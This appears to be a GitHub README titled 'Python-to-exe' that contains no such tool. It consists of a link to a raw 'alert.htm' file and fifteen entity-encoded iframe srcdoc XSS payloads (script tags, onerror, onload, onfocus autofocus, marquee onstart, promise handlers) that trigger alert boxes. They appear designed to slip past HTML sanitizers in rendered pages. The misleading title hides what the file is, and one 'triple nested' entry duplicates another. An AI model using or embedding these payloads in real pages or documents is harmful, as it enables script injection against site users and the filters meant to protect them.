# Python-to-exe

## 🎯 Direct Link (Works!)

[CLICK HERE FOR ALERT!](https://raw.githubusercontent.com/bearertoken1/Python-to-exe/main/alert.htm)

## Srcdoc Entity Encoding Payloads:

<!-- Method 1: Srcdoc with entity encoding (basic) -->
<iframe srcdoc="&lt;script&gt;alert('hi bearert0ken')&lt;/script&gt;"></iframe>

<!-- Method 2: Srcdoc double encoded -->
<iframe srcdoc="&amp;lt;script&amp;gt;alert('hi bearert0ken')&amp;lt;/script&amp;gt;"></iframe>

<!-- Method 3: Srcdoc with HTML numeric entities -->
<iframe srcdoc="&#60;script&#62;alert('hi bearert0ken')&#60;/script&#62;"></iframe>

<!-- Method 4: Srcdoc with img onerror (entity encoded) -->
<iframe srcdoc="&lt;img src=x onerror=alert('hi_bearert0ken')&gt;"></iframe>

<!-- Method 5: Srcdoc with SVG onload (entity encoded) -->
<iframe srcdoc="&lt;svg onload=alert('hi bearert0ken')&gt;&lt;/svg&gt;"></iframe>

<!-- Method 6: Srcdoc with body onload -->
<iframe srcdoc="&lt;body onload=alert('hi bearert0ken')&gt;&lt;/body&gt;"></iframe>

<!-- Method 7: Srcdoc with input autofocus + onfocus -->
<iframe srcdoc="&lt;input autofocus onfocus=alert('hi bearert0ken')&gt;"></iframe>

<!-- Method 8: Srcdoc with button autofocus + onclick -->
<iframe srcdoc="&lt;button autofocus onclick=alert('hi bearert0ken')&gt;x&lt;/button&gt;"></iframe>

<!-- Method 9: Srcdoc with form + button -->
<iframe srcdoc="&lt;form onsubmit=alert('hi bearert0ken')&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/form&gt;"></iframe>

<!-- Method 10: Srcdoc with marquee + onstart -->
<iframe srcdoc="&lt;marquee onstart=alert('hi bearert0ken')&gt;&lt;/marquee&gt;"></iframe>

<!-- Method 11: Triple nested entity encoding -->
<iframe srcdoc="&amp;lt;script&amp;gt;alert('hi bearert0ken')&amp;lt;/script&amp;gt;"></iframe>

<!-- Method 12: Srcdoc with fetch error handling -->
<iframe srcdoc="&lt;script&gt;fetch('x').catch(()=&gt;alert('hi bearert0ken'))&lt;/script&gt;"></iframe>

<!-- Method 13: Srcdoc with Promise rejection -->
<iframe srcdoc="&lt;script&gt;Promise.reject().catch(()=&gt;alert('hi bearert0ken'))&lt;/script&gt;"></iframe>

<!-- Method 14: Srcdoc mixed case encoding -->
<iframe srcdoc="&Lt;script&Gt;alert('hi bearert0ken')&Lt;/script&Gt;"></iframe>

<!-- Method 15: Srcdoc with decimal entities -->
<iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('hi bearert0ken')&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"></iframe>
